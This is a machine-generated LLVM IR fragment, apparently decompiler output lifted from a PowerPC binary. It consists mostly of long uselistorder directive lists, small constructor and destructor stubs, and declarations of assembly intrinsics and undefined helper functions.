  uselistorder i32 -1, { 363, 364, 16, 47, 60, 300, 301, 246, 130, 302, 61, 303, 51, 62, 304, 63, 305, 227, 228, 113, 114, 65, 64, 229, 48, 49, 230, 231, 232, 189, 71, 69, 67, 233, 234, 235, 70, 68, 66, 236, 237, 190, 238, 191, 306, 25, 26, 192, 307, 193, 52, 308, 72, 247, 131, 3, 4, 248, 249, 53, 250, 251, 73, 74, 194, 365, 29, 30, 31, 366, 195, 370, 27, 28, 310, 32, 320, 321, 322, 134, 323, 324, 325, 326, 327, 328, 329, 132, 330, 133, 331, 332, 333, 334, 196, 252, 197, 54, 5, 198, 253, 254, 199, 200, 201, 255, 202, 335, 336, 33, 34, 35, 203, 337, 338, 204, 311, 315, 316, 50, 256, 257, 258, 123, 55, 259, 260, 261, 262, 135, 263, 6, 75, 264, 265, 266, 267, 268, 205, 269, 136, 347, 348, 137, 7, 8, 138, 56, 270, 206, 207, 271, 272, 273, 274, 76, 77, 353, 139, 78, 79, 80, 81, 82, 83, 84, 0, 373, 371, 85, 287, 288, 140, 208, 289, 38, 39, 209, 290, 36, 37, 210, 245, 9, 141, 86, 87, 291, 142, 239, 10, 88, 57, 298, 40, 41, 211, 143, 115, 299, 89, 240, 354, 355, 46, 241, 369, 292, 90, 293, 212, 294, 42, 43, 295, 296, 352, 58, 213, 339, 116, 340, 341, 144, 345, 91, 349, 374, 375, 275, 350, 92, 214, 215, 342, 343, 216, 344, 120, 59, 217, 218, 219, 220, 221, 44, 222, 145, 93, 317, 117, 312, 314, 313, 17, 18, 19, 20, 21, 22, 23, 118, 119, 276, 15, 277, 11, 278, 279, 223, 146, 24, 224, 280, 281, 1, 283, 284, 2, 147, 148, 225, 45, 149, 124, 285, 150, 282, 318, 12, 13, 286, 151, 319, 152, 309, 153, 94, 95, 96, 367, 368, 97, 98, 99, 100, 101, 102, 103, 104, 105, 242, 106, 107, 108, 109, 110, 111, 372, 112, 376, 154, 187, 243, 244, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 297, 168, 169, 170, 171, 172, 14, 173, 174, 346, 188, 226, 175, 176, 121, 177, 178, 351, 179, 122, 180, 125, 126, 127, 128, 129, 181, 182, 356, 357, 358, 183, 359, 360, 361, 362, 184, 185, 186 }
  uselistorder i32 1, { 156, 847, 322, 848, 849, 850, 851, 852, 853, 141, 142, 143, 854, 463, 855, 856, 179, 180, 178, 181, 537, 139, 140, 857, 398, 858, 402, 861, 862, 863, 864, 865, 464, 866, 867, 868, 42, 41, 46, 45, 44, 43, 47, 40, 48, 869, 870, 871, 538, 99, 102, 100, 98, 101, 103, 872, 104, 105, 873, 27, 874, 243, 242, 241, 244, 388, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 540, 539, 226, 225, 224, 227, 229, 228, 736, 737, 738, 739, 541, 533, 278, 270, 280, 269, 275, 276, 277, 274, 272, 273, 271, 279, 281, 413, 875, 876, 391, 877, 878, 879, 880, 881, 882, 542, 176, 173, 177, 175, 174, 452, 886, 883, 884, 885, 543, 154, 152, 151, 148, 150, 153, 155, 147, 146, 149, 145, 144, 887, 828, 829, 830, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 63, 60, 61, 58, 65, 59, 62, 64, 403, 831, 268, 66, 39, 184, 404, 765, 5, 6, 4, 7, 49, 766, 545, 544, 96, 95, 97, 282, 323, 1038, 465, 466, 547, 546, 205, 201, 204, 203, 200, 202, 550, 549, 548, 56, 57, 551, 906, 389, 907, 910, 911, 912, 913, 914, 553, 552, 324, 325, 326, 327, 928, 929, 930, 385, 931, 932, 414, 933, 934, 435, 436, 467, 415, 429, 935, 469, 439, 936, 937, 470, 938, 939, 940, 468, 559, 558, 557, 556, 525, 555, 554, 87, 86, 83, 85, 88, 82, 89, 84, 90, 0, 1003, 1004, 1005, 1006, 416, 53, 832, 833, 54, 55, 834, 248, 247, 246, 245, 249, 767, 167, 169, 168, 170, 768, 769, 471, 770, 236, 237, 238, 162, 163, 161, 164, 165, 166, 472, 915, 918, 526, 51, 50, 52, 475, 771, 772, 773, 473, 774, 474, 775, 776, 777, 778, 779, 570, 569, 568, 567, 566, 565, 564, 563, 562, 561, 527, 560, 315, 308, 312, 313, 307, 314, 318, 316, 311, 317, 306, 310, 319, 309, 320, 321, 305, 304, 303, 974, 453, 301, 300, 298, 299, 302, 110, 109, 111, 1040, 1041, 68, 69, 67, 780, 781, 571, 329, 328, 332, 333, 331, 330, 417, 782, 574, 573, 572, 293, 296, 222, 186, 334, 335, 297, 171, 476, 575, 23, 477, 441, 440, 576, 823, 580, 579, 578, 577, 219, 218, 215, 216, 220, 217, 221, 1042, 583, 582, 581, 157, 160, 159, 158, 1043, 584, 758, 759, 760, 454, 761, 24, 25, 26, 478, 762, 418, 479, 480, 481, 482, 585, 740, 18, 14, 12, 16, 13, 17, 15, 19, 842, 419, 843, 586, 337, 336, 338, 339, 340, 341, 21, 22, 20, 32, 28, 31, 30, 33, 35, 29, 34, 587, 588, 589, 262, 591, 590, 38, 36, 37, 8, 10, 11, 9, 195, 194, 399, 592, 342, 1039, 343, 483, 484, 595, 594, 593, 255, 252, 253, 254, 251, 256, 172, 442, 596, 597, 598, 599, 600, 601, 602, 603, 455, 456, 941, 420, 485, 942, 943, 443, 953, 606, 605, 604, 381, 379, 380, 378, 382, 377, 375, 376, 383, 374, 384, 373, 607, 608, 609, 975, 976, 114, 113, 1044, 611, 610, 370, 613, 612, 116, 115, 117, 614, 966, 967, 968, 123, 122, 121, 118, 120, 119, 859, 860, 783, 784, 615, 344, 346, 345, 347, 986, 987, 988, 989, 990, 991, 992, 993, 994, 996, 995, 997, 998, 71, 70, 77, 75, 74, 76, 73, 72, 405, 785, 944, 945, 946, 947, 948, 949, 950, 951, 952, 206, 209, 207, 208, 210, 1029, 1030, 1031, 999, 392, 94, 93, 92, 909, 908, 406, 1000, 250, 824, 825, 826, 112, 1052, 1053, 234, 231, 235, 232, 233, 1048, 1049, 1050, 1051, 350, 349, 348, 91, 486, 444, 919, 920, 921, 430, 407, 108, 107, 106, 917, 616, 138, 421, 487, 916, 618, 617, 619, 214, 213, 212, 620, 288, 289, 287, 286, 621, 267, 266, 786, 787, 489, 788, 789, 790, 791, 792, 793, 795, 796, 797, 490, 798, 799, 422, 800, 488, 801, 491, 802, 803, 804, 794, 625, 624, 623, 622, 131, 130, 127, 125, 126, 128, 133, 132, 129, 805, 806, 807, 808, 809, 353, 351, 352, 354, 355, 492, 290, 291, 810, 811, 136, 135, 137, 134, 813, 423, 814, 400, 424, 816, 817, 818, 819, 425, 821, 427, 820, 815, 528, 632, 631, 630, 629, 628, 627, 626, 358, 360, 356, 359, 357, 363, 361, 362, 364, 408, 409, 191, 192, 193, 812, 445, 529, 493, 260, 259, 258, 1046, 446, 1047, 922, 923, 924, 925, 926, 927, 410, 634, 633, 80, 78, 81, 79, 636, 635, 366, 367, 365, 638, 637, 904, 905, 640, 639, 124, 261, 265, 283, 372, 284, 264, 257, 197, 641, 198, 185, 196, 368, 642, 211, 369, 285, 263, 230, 223, 643, 199, 644, 183, 1045, 645, 182, 741, 426, 431, 401, 742, 743, 744, 386, 496, 745, 746, 747, 428, 748, 749, 750, 751, 752, 494, 495, 437, 497, 753, 652, 651, 650, 649, 648, 647, 646, 754, 755, 657, 656, 655, 530, 654, 653, 498, 756, 757, 658, 499, 763, 764, 500, 659, 822, 501, 661, 660, 663, 662, 827, 665, 664, 534, 835, 502, 670, 669, 668, 667, 666, 836, 837, 503, 838, 839, 840, 675, 674, 673, 672, 671, 841, 679, 678, 677, 676, 844, 504, 505, 845, 846, 683, 682, 681, 680, 292, 447, 506, 507, 686, 685, 684, 457, 954, 688, 687, 190, 189, 188, 432, 390, 955, 433, 956, 689, 448, 957, 508, 509, 959, 393, 958, 510, 692, 691, 690, 387, 960, 961, 511, 512, 513, 969, 531, 962, 963, 449, 450, 514, 964, 515, 965, 394, 699, 698, 697, 696, 695, 694, 693, 397, 970, 971, 458, 972, 516, 973, 395, 702, 701, 700, 703, 977, 978, 979, 517, 980, 981, 396, 982, 518, 983, 706, 705, 704, 532, 984, 240, 985, 707, 519, 1001, 709, 708, 1002, 187, 460, 1007, 1008, 459, 1009, 1010, 461, 462, 1011, 1012, 1013, 1, 2, 1015, 1014, 520, 712, 711, 710, 521, 1016, 1017, 713, 715, 714, 717, 716, 522, 718, 1018, 1019, 451, 1026, 1027, 434, 1028, 719, 438, 3, 721, 720, 412, 1020, 1021, 411, 1024, 1025, 523, 524, 1022, 1023, 722, 239, 1032, 1033, 295, 1034, 1035, 1036, 371, 1037, 724, 723, 294, 535, 536 }
  uselistorder label %dec_label_pc_1001474c, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_1001478c = load i32, i32* @r3, align 4
  ret i32 %v0_1001478c

; uselistorder directives
  uselistorder i32* @r3, { 20, 21, 167, 168, 171, 169, 170, 0, 172, 11, 173, 53, 54, 55, 174, 175, 176, 45, 177, 22, 12, 138, 139, 13, 23, 91, 92, 93, 265, 277, 274, 275, 178, 186, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 14, 224, 225, 226, 227, 228, 229, 230, 231, 232, 140, 141, 15, 142, 143, 144, 24, 94, 95, 96, 97, 98, 16, 233, 42, 25, 99, 100, 101, 102, 103, 104, 2, 1, 105, 106, 107, 26, 278, 50, 290, 3, 27, 4, 41, 135, 136, 49, 284, 285, 286, 44, 157, 158, 159, 160, 161, 162, 163, 164, 56, 57, 58, 59, 60, 247, 248, 61, 43, 62, 19, 28, 266, 267, 276, 137, 234, 235, 236, 237, 238, 239, 240, 241, 35, 36, 37, 38, 287, 288, 5, 108, 109, 110, 111, 272, 254, 255, 17, 29, 289, 30, 192, 193, 194, 195, 196, 197, 198, 31, 187, 188, 189, 190, 191, 63, 64, 199, 200, 65, 66, 112, 32, 113, 114, 115, 6, 10, 7, 116, 8, 117, 9, 118, 119, 120, 121, 122, 123, 33, 124, 125, 126, 127, 128, 129, 52, 279, 280, 281, 282, 283, 201, 202, 203, 204, 205, 206, 207, 208, 130, 131, 132, 179, 180, 181, 182, 183, 184, 185, 67, 68, 34, 69, 70, 71, 72, 73, 75, 74, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 133, 134, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 51, 165, 166, 242, 243, 244, 245, 246, 249, 18, 250, 251, 252, 253, 256, 257, 258, 260, 259, 261, 262, 263, 46, 264, 47, 268, 269, 270, 271, 273, 39, 40, 48 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268519328, i32* @lr, align 4
  %v0_1001479c = call i32 @__do_global_dtors_aux()
  ret i32 %v0_1001479c

; uselistorder directives
  uselistorder i32 0, { 1164, 1165, 36, 1168, 119, 1166, 1167, 60, 1169, 1170, 1171, 1174, 1172, 0, 1173, 1175, 25, 930, 931, 1191, 1178, 1181, 1182, 1183, 322, 1184, 1185, 1187, 1186, 1188, 1189, 1190, 1192, 1193, 1194, 1176, 1177, 1179, 1180, 120, 1195, 1197, 1198, 1196, 1199, 1200, 1201, 1202, 237, 794, 1203, 238, 795, 796, 121, 122, 805, 806, 97, 807, 808, 809, 810, 811, 812, 813, 123, 181, 815, 814, 124, 816, 817, 126, 125, 818, 323, 819, 820, 821, 128, 127, 822, 823, 247, 324, 824, 129, 1204, 1205, 1206, 1207, 1212, 1208, 64, 1213, 1214, 1209, 1210, 1211, 61, 62, 63, 1215, 325, 37, 38, 39, 225, 1217, 130, 1216, 326, 1218, 1219, 1220, 1221, 131, 1222, 98, 40, 1223, 182, 1224, 1225, 1226, 1134, 183, 932, 933, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 934, 26, 935, 133, 132, 936, 937, 938, 939, 134, 1234, 1235, 1236, 1237, 940, 941, 942, 943, 944, 945, 946, 947, 27, 1238, 1459, 327, 1462, 67, 328, 248, 1463, 329, 1466, 1467, 65, 66, 1468, 1460, 1461, 330, 331, 1252, 1245, 332, 68, 1246, 1247, 1248, 41, 1250, 1251, 1275, 1276, 1296, 1297, 1298, 1299, 249, 235, 236, 334, 1300, 1301, 1302, 1304, 184, 1307, 335, 250, 1309, 1310, 1311, 1312, 333, 251, 1306, 1303, 1305, 1308, 1313, 239, 1314, 1315, 1316, 1, 1387, 1388, 1389, 136, 135, 1390, 2, 137, 252, 1135, 1136, 1137, 3, 948, 949, 186, 951, 950, 57, 4, 952, 185, 5, 953, 188, 954, 58, 6, 955, 187, 1317, 1318, 69, 1319, 1320, 1321, 1322, 1323, 1253, 1254, 1269, 336, 1270, 1271, 1272, 956, 957, 958, 959, 960, 337, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 138, 139, 974, 975, 976, 977, 978, 979, 980, 981, 982, 42, 983, 338, 93, 984, 985, 986, 987, 988, 140, 989, 990, 991, 992, 993, 994, 995, 996, 1367, 1368, 141, 1369, 1370, 1371, 309, 310, 1372, 1373, 1374, 28, 7, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 99, 1469, 1470, 1471, 1474, 1472, 8, 189, 1017, 1016, 190, 1015, 100, 1018, 1019, 1020, 142, 1021, 1398, 1412, 1413, 253, 1414, 1150, 1475, 1476, 1477, 1478, 1479, 1415, 339, 340, 1495, 1496, 341, 1501, 1521, 191, 1522, 342, 1513, 9, 1480, 1481, 254, 143, 1116, 1117, 343, 255, 344, 1118, 1119, 72, 73, 1120, 1121, 1122, 345, 1123, 1124, 1125, 70, 71, 1126, 1127, 1482, 1483, 1484, 1485, 1486, 1487, 144, 1494, 882, 883, 884, 885, 886, 145, 887, 888, 889, 311, 890, 346, 891, 256, 347, 348, 349, 1128, 350, 1133, 351, 825, 826, 827, 146, 828, 147, 1157, 1158, 192, 101, 118, 1159, 1160, 10, 1344, 829, 830, 148, 831, 832, 833, 1418, 1420, 43, 1421, 74, 1422, 1419, 1416, 1417, 11, 838, 834, 835, 836, 837, 193, 12, 1425, 1423, 1424, 194, 1426, 1427, 839, 840, 841, 842, 843, 352, 844, 845, 1428, 1429, 353, 1430, 149, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 13, 14, 797, 1129, 1130, 1131, 75, 76, 1132, 15, 354, 312, 313, 355, 1324, 1325, 195, 1326, 1327, 1328, 1329, 1335, 1336, 1337, 1338, 150, 1339, 1340, 1391, 1375, 257, 356, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 357, 1510, 16, 17, 1362, 151, 152, 1022, 1023, 29, 30, 258, 31, 1024, 196, 18, 1381, 1382, 1383, 77, 1025, 1026, 197, 358, 1027, 1330, 1331, 1332, 1333, 1334, 1451, 1452, 198, 1249, 19, 92, 1384, 199, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1514, 1515, 1516, 78, 1517, 1518, 1519, 1520, 153, 1028, 1029, 1030, 1031, 1032, 1033, 154, 1273, 1255, 1256, 1257, 1258, 1259, 1266, 1262, 1263, 1264, 1265, 200, 1267, 1268, 1260, 20, 79, 1261, 846, 1274, 847, 848, 1034, 1035, 102, 1036, 1037, 1038, 1039, 1040, 240, 1041, 1042, 1043, 155, 1044, 1045, 1046, 1047, 1048, 156, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 157, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 44, 173, 174, 201, 1067, 1068, 158, 1069, 359, 1070, 1071, 360, 1074, 163, 159, 1072, 1073, 362, 1075, 1076, 1077, 1079, 164, 1080, 21, 22, 165, 166, 160, 161, 1081, 1082, 162, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 361, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 798, 1102, 1103, 32, 1105, 80, 103, 167, 363, 1108, 314, 1109, 1104, 1106, 1107, 1110, 1111, 168, 801, 802, 94, 59, 86, 1078, 202, 1489, 1491, 1490, 204, 169, 1493, 1492, 203, 259, 1277, 1278, 1279, 170, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 364, 1289, 1290, 1291, 1292, 1293, 1294, 241, 1112, 1113, 365, 1295, 1239, 1240, 1241, 1242, 1243, 1244, 1453, 1473, 366, 1161, 1464, 1465, 849, 1376, 1396, 850, 1402, 1497, 171, 1498, 1457, 1403, 1458, 851, 1404, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 1354, 1405, 1406, 862, 1488, 1499, 1500, 1511, 1512, 244, 368, 369, 205, 863, 372, 34, 35, 373, 864, 865, 381, 382, 466, 467, 33, 45, 242, 367, 799, 370, 243, 371, 866, 206, 104, 374, 867, 868, 869, 870, 872, 226, 871, 873, 874, 377, 378, 375, 376, 875, 379, 380, 262, 261, 260, 263, 207, 877, 383, 876, 386, 387, 384, 385, 878, 388, 879, 389, 880, 390, 881, 391, 46, 87, 105, 106, 107, 892, 245, 396, 264, 893, 894, 403, 895, 897, 395, 404, 896, 211, 898, 899, 900, 401, 901, 903, 394, 402, 902, 210, 904, 905, 399, 906, 908, 393, 400, 907, 209, 909, 398, 910, 911, 912, 405, 913, 915, 392, 406, 914, 208, 916, 397, 917, 918, 919, 407, 920, 921, 408, 922, 923, 924, 409, 925, 926, 927, 928, 929, 172, 410, 1114, 213, 1115, 212, 175, 411, 214, 108, 413, 267, 268, 265, 414, 1143, 412, 1138, 1139, 1140, 1141, 1142, 215, 1144, 1145, 415, 315, 1146, 266, 1147, 1148, 1149, 109, 177, 418, 271, 272, 229, 227, 228, 419, 91, 316, 1151, 420, 417, 270, 1152, 176, 421, 269, 232, 230, 231, 422, 416, 1153, 1154, 1155, 1156, 273, 424, 425, 426, 423, 427, 428, 429, 430, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 1162, 47, 1163, 274, 431, 432, 433, 434, 435, 436, 437, 48, 178, 448, 449, 450, 451, 275, 276, 277, 1341, 317, 1342, 246, 1343, 81, 88, 89, 96, 95, 49, 50, 1345, 278, 279, 280, 281, 1353, 1347, 1349, 1350, 1351, 453, 1352, 454, 283, 282, 452, 82, 1346, 1348, 51, 110, 217, 216, 23, 24, 800, 455, 1355, 284, 285, 286, 287, 1356, 1357, 288, 289, 456, 83, 1358, 111, 90, 1363, 218, 179, 1364, 290, 1359, 1360, 457, 458, 459, 1361, 318, 461, 1365, 292, 291, 460, 84, 462, 1366, 293, 1377, 233, 465, 1378, 296, 464, 85, 1379, 295, 463, 219, 294, 52, 180, 1380, 297, 468, 469, 470, 1386, 471, 1385, 473, 474, 472, 1392, 1393, 319, 1394, 1395, 112, 53, 320, 1397, 220, 1399, 475, 476, 477, 298, 1400, 1401, 299, 478, 1407, 1408, 479, 1409, 1410, 1411, 480, 113, 302, 300, 301, 481, 482, 1450, 114, 54, 234, 221, 305, 306, 1439, 1440, 1441, 1442, 222, 303, 304, 307, 1443, 1444, 1445, 224, 55, 115, 116, 223, 1447, 1448, 1449, 321, 117, 56, 1446, 1454, 1455, 308, 1531, 1532, 1533, 1456, 803, 804, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557 }
  uselistorder i32* @lr, { 10, 335, 336, 337, 338, 339, 340, 177, 588, 589, 590, 341, 345, 342, 343, 344, 349, 350, 346, 347, 348, 351, 352, 353, 354, 355, 11, 12, 13, 16, 14, 15, 356, 359, 357, 1, 358, 0, 360, 363, 364, 361, 362, 365, 366, 367, 368, 369, 370, 371, 372, 279, 178, 179, 373, 374, 375, 376, 180, 181, 182, 183, 565, 595, 596, 597, 598, 591, 592, 593, 594, 377, 382, 397, 383, 384, 385, 398, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 528, 280, 281, 282, 283, 184, 185, 186, 599, 187, 188, 386, 387, 392, 393, 394, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 600, 601, 201, 202, 566, 567, 610, 611, 615, 616, 617, 618, 619, 632, 634, 636, 612, 614, 296, 252, 253, 254, 255, 256, 257, 258, 602, 608, 609, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 275, 17, 18, 327, 20, 328, 19, 21, 568, 570, 569, 22, 23, 24, 25, 26, 27, 571, 572, 573, 574, 575, 576, 274, 539, 438, 439, 297, 577, 503, 479, 82, 480, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 453, 454, 455, 456, 529, 501, 620, 621, 622, 623, 624, 627, 628, 629, 492, 203, 204, 205, 514, 515, 516, 517, 206, 451, 452, 518, 635, 633, 207, 208, 209, 395, 388, 390, 391, 389, 28, 396, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 8, 9, 224, 603, 604, 605, 606, 607, 630, 631, 399, 400, 401, 402, 403, 404, 405, 406, 238, 239, 240, 378, 379, 380, 381, 531, 29, 548, 30, 31, 32, 33, 613, 549, 625, 626, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 60, 59, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 243, 241, 242, 2, 244, 245, 246, 247, 248, 249, 250, 251, 276, 277, 278, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 3, 4, 5, 6, 7, 329, 330, 331, 332, 333, 334, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 493, 494, 495, 476, 477, 478, 481, 482, 483, 484, 485, 486, 487, 496, 488, 489, 490, 491, 497, 498, 499, 500, 502, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 519, 520, 521, 522, 523, 524, 525, 526, 527, 530, 532, 533, 534, 535, 536, 537, 538, 540, 541, 542, 543, 544, 545, 546, 547, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 578, 579, 580, 581, 582, 583, 585, 584, 586, 587 }
}

declare i32 @__asm_rlwinm(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwinm.(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_rlwimi(i32, i32, i32, i32) local_unnamed_addr

declare i32 @__asm_mfcr() local_unnamed_addr

declare %0 @__asm_mtcrf(i32, i32) local_unnamed_addr

declare %2 @__asm_mcrf_cr0_write(i4) local_unnamed_addr

declare %1 @__asm_cror(i32, i32, i32) local_unnamed_addr

declare i32 @unknown_0(i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr
